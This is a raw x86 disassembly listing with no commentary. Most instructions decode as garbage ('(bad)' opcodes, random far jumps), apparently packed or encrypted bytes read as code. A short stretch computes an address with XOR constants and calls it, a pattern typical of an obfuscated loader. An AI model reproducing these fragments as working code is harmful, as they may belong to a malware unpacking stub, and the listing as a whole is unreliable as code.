  40db64:	mov    dl,0xf6
  40db66:	mov    esi,0xa1ce7299
  40db6b:	(bad)  [ebx-0x7bee97d1]
  40db71:	aam    0xe5
  40db73:	(bad)  
  40db74:	scas   eax,DWORD PTR es:[edi]
  40db75:	stos   BYTE PTR es:[edi],al
  40db76:	ds stc 
  40db78:	mov    al,ds:0x3ca1bcad
  40db7d:	outs   dx,DWORD PTR ds:[esi]
  40db7e:	pop    edx
  40db7f:	bound  ebx,QWORD PTR [esi-0x80]
  40db82:	popf   
  40db83:	scas   al,BYTE PTR es:[edi]
  40db84:	push   edi
  40db85:	loope  0x40db83
  40db87:	pop    edi
  40db88:	inc    edx
  40db89:	xor    al,BYTE PTR [ecx]
  40db8b:	jp     0x40db0f
  40db8d:	xor    ch,bl
  40db8f:	pop    edx
  40db90:	push   edx
  40db91:	xchg   ecx,eax
  40db92:	dec    edi
  40db93:	mov    cl,0x9f
  40db95:	mov    bh,0xef
  40db97:	cmp    eax,0x8380655f
  40db9c:	mov    al,ds:0x2251e3e3
  40dba1:	test   edi,edi
  40dba3:	lods   al,BYTE PTR ds:[esi]
  40dba4:	push   edx
  40dba5:	outs   dx,BYTE PTR ds:[esi]
  40dba6:	cdq    
  40dba7:	cmp    eax,0xd7ef117e
  40dbac:	stos   BYTE PTR es:[edi],al
  40dbad:	pop    edx
  40dbae:	(bad)  
  40dbaf:	push   es
  40dbb0:	inc    ecx
  40dbb1:	xchg   esi,eax
  40dbb2:	mov    ch,0xd7
  40dbb4:	and    al,0xe7
  40dbb6:	rcr    dh,cl
  40dbb8:	pop    ecx
  40dbb9:	mov    esi,0x8352ac65
  40dbbe:	mov    dh,0xbe
  40dbc0:	outs   dx,BYTE PTR ds:[esi]
  40dbc1:	shr    DWORD PTR [esi+0x6a],0xd4
  40dbc5:	call   FWORD PTR [esi-0x149b3da]
  40dbcb:	mov    bh,0x9a
  40dbcd:	adc    al,0x9a
  40dbcf:	mov    cl,0xa1
  40dbd1:	cmp    esi,ebx
  40dbd3:	mov    al,ds:0x13639a56
  40dbd8:	and    al,BYTE PTR [edx+0xb0da584]
  40dbde:	jecxz  0x40db8b
  40dbe0:	add    DWORD PTR [ebp-0x33274f68],esi
  40dbe6:	aas    
  40dbe7:	test   eax,0xc3ab4679
  40dbec:	inc    ebp
  40dbed:	repnz dec esp
  40dbef:	addr16 jle 0x40dc2b
  40dbf2:	pop    edx
  40dbf3:	arpl   cx,sp
  40dbf5:	and    dl,BYTE PTR [edx+ecx*2-0x16]
  40dbf9:	ins    BYTE PTR es:[edi],dx
  40dbfa:	add    DWORD PTR [eax-0x21db4ea9],edi
  40dc00:	mov    ch,0x77
  40dc02:	stc    
  40dc03:	scas   eax,DWORD PTR es:[edi]
  40dc04:	les    ecx,FWORD PTR [ecx]
  40dc06:	fldenv [esi-0x19]
  40dc09:	scas   eax,DWORD PTR es:[edi]
  40dc0a:	rol    ah,1
  40dc0c:	fsub   QWORD PTR [esi+edi*8+0x38911304]
  40dc13:	cmp    ch,al
  40dc15:	push   ecx
  40dc16:	or     ah,BYTE PTR [eax]
  40dc18:	aaa    
  40dc19:	lahf   
  40dc1a:	ins    DWORD PTR es:[edi],dx
  40dc1b:	scas   eax,DWORD PTR es:[edi]
  40dc1c:	data16 cli 
  40dc1e:	out    0x31,al
  40dc20:	cmp    al,0xdb
  40dc22:	dec    esp
  40dc23:	nop
  40dc24:	xchg   ecx,eax
  40dc25:	adc    eax,0x9c78ebb
  40dc2a:	ret    
  40dc2b:	fst    DWORD PTR [ebx+0x1b]
  40dc2e:	adc    al,0xa4
  40dc30:	daa    
  40dc31:	mov    cl,0x79
  40dc33:	hlt    
  40dc34:	ror    BYTE PTR [esi*1+0x5253c5bb],0x1d
  40dc3c:	adc    BYTE PTR [esi-0xa],ch
  40dc3f:	imul   edx,edi,0xffffff88
  40dc42:	fsubr  QWORD PTR [esi-0x2a]
  40dc45:	scas   eax,DWORD PTR es:[edi]
  40dc46:	inc    ebp
  40dc47:	pop    es
  40dc48:	stos   BYTE PTR es:[edi],al
  40dc49:	mov    al,ds:0x9aba0d37
  40dc4e:	iret   
  40dc4f:	mov    al,0xb7
  40dc51:	jl     0x40dc73
  40dc53:	inc    esp
  40dc54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc55:	adc    BYTE PTR [edi],dl
  40dc57:	sbb    BYTE PTR [edx],al
  40dc59:	imul   esi,DWORD PTR [esi],0xfc3980d9
  40dc5f:	mov    ebx,0x8f8f189
  40dc64:	mov    edx,DWORD PTR [ebp+0x8]
  40dc67:	mov    edi,DWORD PTR [ebp-0x24]
  40dc6a:	jmp    0x40df8a
  40dc6f:	repnz cmp al,0x15
  40dc72:	adc    al,0x31
  40dc74:	aad    0xf3
  40dc76:	fcom   DWORD PTR [eax*8-0x5553768]
  40dc7d:	or     esp,ebx
  40dc7f:	xor    eax,0x7d7e7e9a
  40dc84:	jge    0x40dd04
  40dc86:	jle    0x40dcd7
  40dc88:	jge    0x40dcb7
  40dc8a:	push   ecx
  40dc8b:	sbb    BYTE PTR [esi],0x72
  40dc8e:	(bad)  
  40dc8f:	push   ebp
  40dc90:	pop    esp
  40dc91:	cld    
  40dc92:	not    DWORD PTR [ebp-0x78]
  40dc95:	mov    esp,0x525a8c9d
  40dc9a:	or     DWORD PTR [ebx-0x128fb7d6],0xf28c1a5
  40dca4:	xchg   edx,eax
  40dca5:	out    dx,eax
  40dca6:	jb     0x40dd01
  40dca8:	lods   al,BYTE PTR ds:[esi]
  40dca9:	push   ebp
  40dcaa:	clc    
  40dcab:	cmp    DWORD PTR [edi+0x24e29847],0x35ba5d2f
  40dcb5:	das    
  40dcb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcb7:	mov    al,dh
  40dcb9:	vxorps xmm6,xmm2,XMMWORD PTR [edx+eax*4]
  40dcbe:	or     BYTE PTR ds:0x2ee443bc,al
  40dcc4:	jo     0x40dc4a
  40dcc6:	jnp    0x40dc86
  40dcc8:	inc    ebx
  40dcc9:	cmp    eax,DWORD PTR [edx+0x46]
  40dccc:	cmp    BYTE PTR [esi+0x38],cl
  40dccf:	dec    eax
  40dcd0:	push   esi
  40dcd1:	mov    edi,0xe516ac0e
  40dcd6:	push   esp
  40dcd7:	hlt    
  40dcd8:	pop    ecx
  40dcd9:	cmp    ch,cl
  40dcdb:	sub    BYTE PTR [ecx+0x25],cl
  40dcde:	scas   eax,DWORD PTR es:[edi]
  40dcdf:	pushf  
  40dce0:	cmp    eax,DWORD PTR [edi]
  40dce2:	and    ecx,DWORD PTR [esp+ecx*4]
  40dce5:	repz mov ah,0x61
  40dce8:	and    ecx,DWORD PTR [eax+eiz*2]
  40dceb:	mov    ebx,0xfbf783b3
  40dcf0:	lods   eax,DWORD PTR ds:[esi]
  40dcf1:	push   cs
  40dcf2:	sub    al,0xb1
  40dcf4:	nop
  40dcf5:	icebp  
  40dcf6:	add    al,0x6e
  40dcf8:	push   edi
  40dcf9:	xchg   edx,eax
  40dcfa:	adc    BYTE PTR [esi+0x2d],0x29
  40dcfe:	inc    esp
  40dcff:	out    dx,al
  40dd00:	in     al,0x14
  40dd02:	mov    ecx,0x27379eee
  40dd07:	imul   edi
  40dd09:	jno    0x40dd61
  40dd0b:	popf   
  40dd0c:	outs   dx,DWORD PTR ds:[esi]
  40dd0d:	in     al,0x83
  40dd0f:	out    dx,al
  40dd10:	add    DWORD PTR [edi+ebx*2-0x2a],0xffffff81
  40dd15:	jnp    0x40dcc8
  40dd17:	mov    bl,0x43
  40dd19:	ds and eax,edx
  40dd1c:	out    0x5a,eax
  40dd1e:	int3   
  40dd1f:	push   ecx
  40dd20:	(bad)  
  40dd21:	mov    DWORD PTR [ecx-0x6e],edx
  40dd24:	jae    0x40dd11
  40dd26:	dec    DWORD PTR [ecx+0x495c1c77]
  40dd2c:	cmc    
  40dd2d:	outs   dx,DWORD PTR ds:[esi]
  40dd2e:	stos   BYTE PTR es:[edi],al
  40dd2f:	ja     0x40dd75
  40dd31:	and    eax,DWORD PTR [esi-0x31fdd88e]
  40dd37:	int3   
  40dd38:	test   al,0xd1
  40dd3a:	push   edi
  40dd3b:	arpl   ax,cx
  40dd3d:	inc    ebp
  40dd3e:	jecxz  0x40dd1a
  40dd40:	lahf   
  40dd41:	(bad)  
  40dd42:	mov    ebx,0x5addcca2
  40dd47:	mov    WORD PTR [ebx-0x4e5d4135],cs
  40dd4d:	mov    ebp,0x53a5763a
  40dd52:	les    ebx,FWORD PTR [eax]
  40dd54:	xor    ah,BYTE PTR [ecx-0x27]
  40dd57:	in     al,0x5f
  40dd59:	add    DWORD PTR [ecx],ecx
  40dd5b:	scas   eax,DWORD PTR es:[edi]
  40dd5c:	add    DWORD PTR [ecx+0x2cd05cc0],0x52
  40dd63:	stc    
  40dd64:	cs jp  0x40dd3a
  40dd67:	pop    ebx
  40dd68:	sub    al,0x68
  40dd6a:	dec    esi
  40dd6b:	add    al,BYTE PTR [eax]
  40dd6d:	jmp    0x40dcfd
  40dd6f:	jb     0x40dd76
  40dd71:	(bad)  
  40dd72:	mov    edx,0x74b9c65b
  40dd77:	clc    
  40dd78:	add    esp,DWORD PTR ds:0x520cdefe
  40dd7e:	leave  
  40dd7f:	lea    ecx,[esi-0x38]
  40dd82:	(bad)  
  40dd83:	stc    
  40dd84:	push   ebx
  40dd85:	inc    esp
  40dd86:	adc    eax,0x2c177f66
  40dd8b:	mov    bl,0x63
  40dd8d:	hlt    
  40dd8e:	xor    DWORD PTR [edi-0x2c1906c9],0xffffffaa
  40dd95:	jne    0x40dda6
  40dd97:	jno    0x40ddfc
  40dd99:	pop    ss
  40dd9a:	dec    ecx
  40dd9b:	add    al,0x4a
  40dd9d:	inc    ebx
  40dd9e:	mov    eax,ds:0x5693be8c
  40dda3:	pop    eax
  40dda4:	jmp    0x2fa8:0xeaaaf08
  40ddab:	inc    eax
  40ddac:	clc    
  40ddad:	mov    eax,DWORD PTR [ecx]
  40ddaf:	xor    ebx,DWORD PTR [ebx+0x4a880015]
  40ddb5:	push   es
  40ddb6:	and    al,0x7f
  40ddb8:	ret    0x5484
  40ddbb:	dec    esi
  40ddbc:	mov    ch,0x58
  40ddbe:	mov    esi,0x36b863d6
  40ddc3:	jmp    0x95326394
  40ddc8:	mov    bh,0xea
  40ddca:	dec    esi
  40ddcb:	data16 fistp DWORD PTR ds:[ebx-0x43]
  40ddd0:	in     eax,dx
  40ddd1:	mov    edi,0x6081994b
  40ddd6:	add    DWORD PTR [ebp-0x228c0611],0x4b9f646c
  40dde0:	test   eax,0x2c233759
  40dde5:	(bad)
  40dde8:	mov    eax,0x73acdcaa
  40dded:	inc    eax
  40ddee:	ret    0x9158
  40ddf1:	fisttp WORD PTR [eax]
  40ddf3:	out    dx,eax
  40ddf4:	int3   
  40ddf5:	pop    ds
  40ddf6:	adc    al,0xf5
  40ddf8:	sar    BYTE PTR [esi-0x73e6798d],cl
  40ddfe:	cs cmc 
  40de00:	push   ds
  40de01:	sbb    al,bh
  40de03:	bound  ebp,QWORD PTR [edi+0xbfe1d33]
  40de09:	jp     0x40de33
  40de0b:	mov    ah,0x3b
  40de0d:	jl     0x40de18
  40de0f:	(bad)  
  40de10:	popf   
  40de11:	jns    0x40de7c
  40de13:	shl    BYTE PTR [ebp-0x31],cl
  40de16:	xchg   ah,bh
  40de18:	or     eax,0xa0fd95ca
  40de1d:	cmp    eax,0x39e847a1
  40de22:	lahf   
  40de23:	sbb    eax,0xbc148f6f
  40de28:	cmp    esp,DWORD PTR [edi]
  40de2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40de2b:	dec    ebp
  40de2c:	jmp    0xb3c:0x541147ed
  40de33:	sub    ah,BYTE PTR [eax+0x24f42e9f]
  40de39:	cwde   
  40de3a:	add    eax,0x9da44ea6
  40de3f:	imul   ebp,DWORD PTR [ebx-0x4f23fb4b],0x17228205
  40de49:	pop    esp
  40de4a:	add    ebp,DWORD PTR [esi+0x2d7b3018]
  40de50:	adc    dh,BYTE PTR [ecx+ebp*8+0x41845b9a]
  40de57:	and    BYTE PTR [edx],dh
  40de59:	int    0xa5
  40de5b:	retf   0x83d3
  40de5e:	cmp    al,0x44
  40de60:	adc    ch,BYTE PTR [ecx+0x3f84b21d]
  40de66:	or     ebx,DWORD PTR [eax+0x34]
  40de69:	dec    esi
  40de6a:	pop    ebp
  40de6b:	sti    
  40de6c:	add    eax,0x2aaf4401
  40de71:	fs jno 0x40de38
  40de74:	outs   dx,DWORD PTR ds:[esi]
  40de75:	shl    bl,cl
  40de77:	add    eax,0x1ce0a88
  40de7c:	jmp    0xb43f:0x2a396a3a
  40de83:	ret    
  40de84:	fistp  WORD PTR [edx-0x7402dde3]
  40de8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de8b:	cmp    DWORD PTR [ebx],ecx
  40de8d:	cmp    al,0x2
  40de8f:	mov    cl,0x7b
  40de91:	mov    ch,0x1a
  40de93:	frstor [ecx+eiz*4+0x28]
  40de97:	pop    ecx
  40de98:	cld    
  40de99:	inc    edx
  40de9a:	out    dx,eax
  40de9b:	in     al,0xfc
  40de9d:	fisub  WORD PTR [edx-0x2a]
  40dea0:	test   DWORD PTR [edx+edi*2+0x4],eax
  40dea4:	test   ebx,ebx
  40dea6:	in     al,dx
  40dea7:	in     eax,0xf1
  40dea9:	retf   0x8b9f
  40deac:	jmp    0xbe85e9a4
  40deb1:	rol    DWORD PTR [ebx],1
  40deb3:	push   0xffffff8f
  40deb5:	in     eax,dx
  40deb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40deb7:	leave  
  40deb8:	(bad)  
  40deb9:	rol    ch,cl
  40debb:	cmp    esi,DWORD PTR [ecx+0x4428d783]
  40dec1:	cmp    BYTE PTR [edi-0x4e],ch
  40dec4:	cdq    
  40dec5:	push   ds
  40dec6:	push   DWORD PTR [edx+0x65ec65ec]
  40decc:	push   ss
  40decd:	mov    ecx,0x345d3f7d
  40ded2:	aaa    
  40ded3:	(bad)  
  40ded4:	xchg   edi,eax
  40ded5:	jmp    0xbb3cebf8
  40deda:	(bad)  
  40dedb:	js     0x40deb6
  40dedd:	retf   
  40dede:	and    eax,DWORD PTR [ebp-0x6b8c349e]
  40dee4:	add    esp,esi
  40dee6:	pop    esp
  40dee7:	or     DWORD PTR [edx+ecx*1+0xa],ebp
  40deeb:	pop    ebx
  40deec:	in     al,dx
  40deed:	loope  0x40df1c
  40deef:	ffree  st(3)
  40def1:	(bad)  
  40def3:	mov    ch,0x42
  40def5:	cwde   
  40def6:	call   0xee9a7704
  40defb:	sbb    BYTE PTR [eax],bh
  40defd:	and    BYTE PTR [ebx+0x2670836e],al
  40df03:	rcl    DWORD PTR [edi+0x24],0x6d
  40df07:	lahf   
  40df08:	jnp    0x40df01
  40df0a:	gs in  al,dx
  40df0c:	pop    es
  40df0d:	pop    edx
  40df0e:	adc    eax,0xf85c2ccd
  40df13:	fwait
  40df14:	imul   DWORD PTR [ebx-0x45b4c19c]
  40df1a:	ret    
  40df1b:	adc    ch,BYTE PTR [ebx+0x78]
  40df1e:	mov    edx,0xc3f36ffc
  40df23:	retf   
  40df24:	cmp    eax,DWORD PTR [esi-0x6d22c0dd]
  40df2a:	push   es
  40df2b:	jmp    0xf4e1db9b
  40df30:	fisttp DWORD PTR [edi+edx*4]
  40df33:	pop    edi
  40df34:	push   cs
  40df35:	mov    ecx,0xe522e781
  40df3a:	cdq    
  40df3b:	xor    ebx,DWORD PTR [esi-0x58a628ca]
  40df41:	test   al,0x21
  40df43:	xor    ch,BYTE PTR [eax]
  40df45:	push   0xc83161c2
  40df4a:	pop    edi
  40df4b:	sti    
  40df4c:	out    0x1a,al
  40df4e:	and    DWORD PTR [edi],edi
  40df50:	cmp    DWORD PTR [ecx-0x60],ebp
  40df53:	push   cs
  40df54:	xor    DWORD PTR [eax-0x56438f08],edi
  40df5a:	fsub   st(1),st
  40df5c:	mov    bl,0x2e
  40df5e:	mov    WORD PTR [ebx],fs
  40df60:	push   edi
  40df61:	sahf   
  40df62:	mov    WORD PTR [edi+0x59],fs
  40df65:	call   0x2068ebe3
  40df6a:	add    al,BYTE PTR [edi+eiz*2-0x7490cc72]
  40df71:	imul   esp,DWORD PTR [ebp+0x10],0x1490c4a8
  40df78:	fldcw  WORD PTR [edx-0x4f]
  40df7b:	sbb    bh,dl
  40df7d:	inc    ebp
  40df7e:	es dec ebx
  40df80:	es pusha 
  40df82:	sahf   
  40df83:	push   es
  40df84:	jmp    0x40dfb9
  40df86:	ins    DWORD PTR es:[edi],dx
  40df87:	into   
  40df88:	aad    0x8
  40df8a:	mov    DWORD PTR [edi+edx*4],eax
  40df8d:	mov    eax,DWORD PTR [ebp-0x18]
  40df90:	mov    edx,DWORD PTR [ebp+0x8]
  40df93:	xor    eax,ecx
  40df95:	lea    eax,[eax+edx*1+0x32729b]
  40df9c:	mov    DWORD PTR [ebp+0x8],eax
  40df9f:	mov    eax,DWORD PTR [ebp-0x18]
  40dfa2:	mov    edx,DWORD PTR [ebp+0x14]
  40dfa5:	xor    eax,ecx
  40dfa7:	add    eax,esi
  40dfa9:	imul   eax,DWORD PTR [edx]
  40dfac:	mov    edx,DWORD PTR [ebp-0x4]
  40dfaf:	xor    edx,ecx
  40dfb1:	mov    ecx,DWORD PTR [ebp+0x8]
  40dfb4:	lea    ecx,[edx+ecx*1+0x32729b]
  40dfbb:	cmp    ecx,eax
  40dfbd:	jne    0x40d5f9
  40dfc3:	mov    ebx,esi
  40dfc5:	jmp    0x40dfcf
  40dfca:	mov    ebx,0x32729b
  40dfcf:	mov    eax,DWORD PTR [ebp-0x4]
  40dfd2:	xor    eax,0x7510854
  40dfd7:	add    eax,ebx
  40dfd9:	mov    DWORD PTR [ebp-0xc],eax
  40dfdc:	xor    ebx,ebx
  40dfde:	lea    eax,[ebp-0x10]
  40dfe1:	add    ebx,DWORD PTR [eax]
  40dfe3:	call   ebx
  40dfe5:	xor    ebx,ebx
  40dfe7:	inc    ebx
  40dfe8:	cmp    DWORD PTR [ebp+0x10],ebx
  40dfeb:	je     0x40e009
  40dff1:	xchg   edx,eax
  40dff2:	push   0xa
  40dff4:	pop    ecx
  40dff5:	push   0x4
  40dff7:	pop    ebx
  40dff8:	inc    ebx
  40dff9:	xchg   ebx,ecx
  40dffb:	sub    ebx,ecx
  40dffd:	xchg   ebx,ecx
  40dfff:	dec    ecx
  40e000:	mov    eax,DWORD PTR [ebp-0x1c]
  40e003:	imul   eax,ecx
  40e006:	add    esp,eax
  40e008:	xchg   edx,eax
  40e009:	push   eax
  40e00a:	xor    ebx,ebx
  40e00c:	mov    edx,esp
  40e00e:	dec    edx
  40e00f:	inc    ebx
  40e010:	add    ebx,DWORD PTR [edx+ebx*1]
  40e013:	jmp    0x40e333
  40e018:	lods   al,BYTE PTR ds:[esi]
  40e019:	and    bl,bl
  40e01b:	xchg   esp,eax
  40e01c:	jno    0x40e073
  40e01e:	jno    0x40e042
  40e020:	add    cl,cl
  40e022:	cs (bad) 
  40e025:	popa   
  40e026:	ret    
  40e027:	icebp  
  40e028:	xor    BYTE PTR [ecx+0x7d7d7e7e],bl
  40e02e:	jle    0x40e0ae
  40e030:	sub    eax,DWORD PTR [esi]
  40e032:	jno    0x40e045
  40e034:	cmp    edx,edx
  40e036:	(bad)  
  40e038:	shl    DWORD PTR [ebp-0x19],1
  40e03b:	push   ebp
  40e03c:	test   al,0x4a
  40e03e:	mov    ds:0x3fd0c61c,al
  40e043:	inc    eax
  40e044:	sub    esp,DWORD PTR [eax-0x13]
  40e047:	inc    esp
  40e048:	xor    al,0xc
  40e04a:	loopne 0x40e062
  40e04c:	jg     0x40e003
  40e04e:	adc    al,0xd7
  40e050:	lahf   
  40e051:	inc    ecx
  40e052:	jg     0x40e0d3
  40e054:	aaa    
  40e055:	adc    ecx,edx
  40e057:	mov    cl,0x34
  40e059:	scas   al,BYTE PTR es:[edi]
  40e05a:	add    al,0x83
  40e05c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e05d:	mov    ah,0xa4
  40e05f:	pop    esi
  40e060:	iret   
  40e061:	xchg   ebp,eax
  40e062:	lds    edi,FWORD PTR [ecx]
  40e064:	xchg   ebp,eax
  40e065:	push   edi
  40e066:	ins    BYTE PTR es:[edi],dx
  40e067:	push   0xc4ebe1c2
  40e06c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e06d:	add    al,BYTE PTR [esi+edi*2+0x3cf0a2ab]
  40e074:	push   ds
  40e075:	fisub  DWORD PTR [ecx]
  40e077:	mov    edi,0x6476abde
  40e07c:	bnd jl 0x40e01c
  40e07f:	icebp  
  40e080:	retf   0x6879
  40e083:	rcr    al,cl
  40e085:	mov    ?,WORD PTR [ecx-0x67833104]
  40e08b:	mov    ah,0xb7
  40e08e:	inc    ebp
  40e08f:	dec    esp
  40e090:	push   ss
  40e091:	rol    DWORD PTR [esi],cl
  40e093:	xchg   ebp,eax
  40e094:	jae    0x40e088
  40e096:	pushf  
  40e097:	bound  edi,QWORD PTR [eax]
  40e099:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e09a:	out    0x93,eax
  40e09c:	mov    edx,DWORD PTR [ebx]
  40e09e:	scas   eax,DWORD PTR es:[edi]
  40e09f:	mov    WORD PTR [eax-0x457ed5b5],gs
  40e0a5:	div    bh
  40e0a7:	push   ecx
  40e0a8:	nop
  40e0a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e0aa:	pop    edi
  40e0ab:	outs   dx,DWORD PTR ds:[esi]
  40e0ac:	jo     0x40e03c
  40e0ae:	aad    0xc3
  40e0b0:	dec    ebx
  40e0b1:	push   0x4bb5e655
  40e0b6:	sbb    dl,bh
  40e0b8:	cmp    DWORD PTR es:[esi-0x454d84b],edi
  40e0bf:	iret   
  40e0c0:	movups xmm5,XMMWORD PTR [esi+0x6232f2ed]
  40e0c7:	inc    eax
  40e0c8:	push   ds
  40e0c9:	and    eax,0xabe58f01
  40e0ce:	adc    al,0x42
  40e0d0:	jg     0x40e0e6
  40e0d2:	scas   al,BYTE PTR es:[edi]
  40e0d3:	sbb    bl,BYTE PTR [esi]
  40e0d5:	fs jo  0x40e0bb
  40e0d8:	fs es mov dh,0xf9
  40e0dc:	mov    ds:0x789f1774,eax
  40e0e1:	add    ebx,esi
  40e0e3:	iret   
  40e0e4:	mov    ds:0xccafab38,al
  40e0e9:	add    DWORD PTR [ebp-0x5d],esp
  40e0ec:	ins    DWORD PTR es:[edi],dx
  40e0ed:	inc    edi
  40e0ee:	stos   BYTE PTR es:[edi],al
  40e0ef:	dec    ecx
  40e0f0:	xchg   ebx,eax
  40e0f1:	add    ecx,edx
  40e0f3:	lds    edi,FWORD PTR [esi]
  40e0f5:	(bad)  
  40e0f6:	mov    ?,WORD PTR [ebx+0x20a876cd]
  40e0fc:	mov    al,ds:0x88ef7623
  40e101:	hlt    
  40e102:	aaa    
  40e103:	sbb    edx,DWORD PTR ds:0x455d8c48
  40e109:	nop
  40e10a:	pshufw mm5,QWORD PTR [esi-0x453595f9],0x74
  40e112:	mov    ah,ah
  40e114:	std    
  40e115:	fistp  DWORD PTR [edx]
  40e117:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e118:	dec    edx
  40e119:	xchg   edi,eax
  40e11a:	(bad)  
  40e11b:	fist   WORD PTR [edx+0x164e394c]
  40e121:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e122:	loop   0x40e18a
  40e124:	dec    edx
  40e125:	or     BYTE PTR [ecx-0x2b],0x84
  40e129:	arpl   WORD PTR [ebp+0x70],bp
  40e12c:	xor    al,0xe8
  40e12e:	mov    DWORD PTR [edx-0x60f46b5],ebp
  40e134:	ret    0x7c71
  40e137:	jmp    0x40e0e7
  40e139:	iret   
  40e13a:	sbb    BYTE PTR [esi-0x33c551b9],bh
  40e140:	adc    al,0x70
  40e142:	stos   DWORD PTR es:[edi],eax
  40e143:	jle    0x40e157
  40e145:	(bad)  
  40e146:	stc    
  40e147:	pop    ss
  40e148:	cmp    edx,DWORD PTR [edx+0x21]
  40e14b:	imul   edi,DWORD PTR [edx+eax*1+0x76],0x4c
  40e150:	push   ss
  40e151:	xor    BYTE PTR [ecx+edx*1],bh
  40e154:	lods   al,BYTE PTR ds:[esi]
  40e155:	sub    DWORD PTR [ebx+edx*1],esi
  40e158:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e159:	and    ebx,0x25dc6a2b
  40e15f:	aad    0x5e
  40e161:	fcom   DWORD PTR [eax-0x3]
  40e164:	push   0x5b5dc162
  40e169:	int    0xab
  40e16b:	adc    BYTE PTR [ecx+0x2de1a47],bl
  40e171:	sbb    eax,0x7d3f0d1e
  40e176:	ror    dl,cl
  40e178:	mov    edx,0xbad0c48d
  40e17d:	xchg   edx,eax
  40e17e:	lock cmp BYTE PTR [eax-0x29f4f99e],bl
  40e185:	in     al,0x33
  40e187:	add    BYTE PTR [esi+0x5bddd791],dh
  40e18d:	repz mov eax,0x21d5069a
  40e193:	and    BYTE PTR [ebp-0xe],dh
  40e196:	mov    ds:0x10a4b332,eax
  40e19b:	mov    dh,0xd7
  40e19d:	je     0x40e15f
  40e19f:	iret   
  40e1a0:	int3   
  40e1a1:	(bad)  
  40e1a2:	cwde   
  40e1a3:	fld    QWORD PTR [ebp+0x6a]
  40e1a6:	ins    DWORD PTR es:[edi],dx
  40e1a7:	(bad)  
  40e1a8:	enter  0xa4ac,0x77
  40e1ac:	test   BYTE PTR [eax+0xb],0x42
  40e1b0:	call   0xa0b:0x3c877046
  40e1b7:	outs   dx,DWORD PTR ds:[esi]
  40e1b8:	arpl   WORD PTR [edi],sp
  40e1ba:	or     DWORD PTR [ebp-0x25c3ed01],ecx
  40e1c0:	push   ss
  40e1c1:	push   ds
  40e1c2:	sar    bl,1
  40e1c4:	mov    edi,0x7a986f63
  40e1c9:	sbb    eax,0x4198351f
  40e1ce:	mov    bl,0x33
  40e1d0:	or     DWORD PTR [eax],esp
  40e1d2:	mov    WORD PTR [edi+0x4f08d0c4],fs
  40e1d8:	jl     0x40e1c7
  40e1da:	or     eax,0xd77f8e25
  40e1df:	dec    edx
  40e1e0:	xor    DWORD PTR [esi],0xb2e39f14
  40e1e6:	jmp    0x40e1fd
  40e1e8:	imul   ebx,DWORD PTR [eax+0x1ff659b2],0xda14ed4b
  40e1f2:	scas   al,BYTE PTR es:[edi]
  40e1f3:	les    ebx,FWORD PTR [eax+ebp*1]
  40e1f6:	loopne 0x40e18d
  40e1f8:	fild   DWORD PTR [ebp-0x74]
  40e1fb:	jmp    0xe17d771b
  40e200:	mov    ecx,esi
  40e202:	lods   eax,DWORD PTR ds:[esi]
  40e203:	inc    ebp
  40e204:	mov    eax,0x67de5029
  40e209:	ins    BYTE PTR es:[edi],dx
  40e20a:	shl    eax,0x24
  40e20d:	cmp    al,0xe0
  40e20f:	and    dh,ah
  40e211:	cld    
  40e212:	sub    eax,0xff1b08ba
  40e217:	push   ebp
  40e218:	push   ebp
  40e219:	lods   eax,DWORD PTR ds:[esi]
  40e21a:	(bad)  
  40e21b:	ret    0x42d6
  40e21e:	mov    dl,0x76
  40e220:	mov    bl,0x6a
  40e222:	nop
  40e223:	mov    al,0xbe
  40e225:	out    dx,al
  40e226:	jae    0x40e290
  40e228:	retf   
  40e229:	int    0xb4
  40e22b:	fs mov ah,0x98
  40e22e:	mov    ecx,0x92ebfb27
  40e233:	leave  
  40e234:	jmp    0x40e1d8
  40e236:	jmp    0x40e1d1
  40e238:	imul   ecx,DWORD PTR [edx],0xffffff8c
  40e23b:	jle    0x40e24d
  40e23d:	xor    bl,BYTE PTR [edx]
  40e23f:	mov    bh,0xee
  40e241:	shl    BYTE PTR [edx+0xf4f8666],0xa8
  40e248:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e249:	inc    DWORD PTR [edi-0x189dd16f]
  40e24f:	push   ds
  40e250:	jg     0x40e2ad
  40e252:	ds shl BYTE PTR gs:[edi+0x31],1
  40e257:	or     DWORD PTR [esi],0x4d
  40e25a:	push   ecx
  40e25b:	sub    eax,0x653ae387
  40e260:	mov    ecx,0x62f21d3d
  40e265:	adc    ecx,edi
  40e267:	mov    ch,0x46
  40e269:	adc    al,0x22
  40e26b:	loope  0x40e2a7
  40e26d:	(bad)  
  40e26e:	scas   eax,DWORD PTR es:[edi]
  40e26f:	push   sp
  40e271:	sbb    bl,BYTE PTR [edi-0x42ce69e2]
  40e277:	loop   0x40e287
  40e279:	js     0x40e230
  40e27b:	(bad)  
  40e27c:	ficomp WORD PTR [eax]
  40e27e:	inc    edx
  40e27f:	(bad)  
  40e281:	pop    esi
  40e282:	repz out dx,al
  40e284:	ja     0x40e225
  40e286:	out    0xc0,eax
  40e288:	or     BYTE PTR [ebp+ebx*1+0x3c],0x6d
  40e28d:	mov    dh,dl
  40e28f:	addr16 pop ss
  40e291:	mov    bh,0x78
  40e293:	shr    DWORD PTR [eax],cl
  40e295:	jge    0x40e301
  40e297:	stos   DWORD PTR es:[edi],eax
  40e298:	rcr    dh,0xd2
  40e29b:	push   ecx
  40e29c:	jge    0x40e248
  40e29e:	mov    ebp,0xa0836638
  40e2a3:	(bad)  
  40e2a4:	scas   eax,DWORD PTR es:[edi]
  40e2a5:	fdivr  QWORD PTR [edx-0x2dce02c3]
  40e2ab:	xchg   esi,eax
  40e2ac:	inc    edi
  40e2ad:	jp     0x40e2ea
  40e2af:	mov    edx,0x76432390
  40e2b4:	xor    al,0x53
  40e2b6:	sbb    DWORD PTR [ecx-0x78],0xe
  40e2ba:	ret    
